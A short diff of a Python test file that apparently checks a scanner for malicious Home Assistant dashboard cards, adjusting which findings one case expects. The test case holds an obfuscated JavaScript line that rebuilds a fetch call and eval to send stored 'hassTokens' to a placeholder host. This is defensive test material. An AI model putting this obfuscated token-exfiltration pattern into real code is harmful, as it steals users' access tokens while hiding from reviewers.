@@ -217,7 +217,8 @@ E2E = {
     "eval_computed": (
         "const s = ['fet','ch(\"https://e.invalid/c?t=\"+local','Storage.getItem(\"hass',"
         "'Tokens\"))'].join('');\nglobalThis[['ev','al'].join('')](s);\n",
-        {"card-eval", "card-hidden-name"},
+        # card-eval (medium) gives way to the high card-hidden-name on the same line
+        {"card-hidden-name"},
     ),
     "document": (
         "const d = ['do','cu','ment'].join(''); globalThis[d].write('Hello, world!');\n",
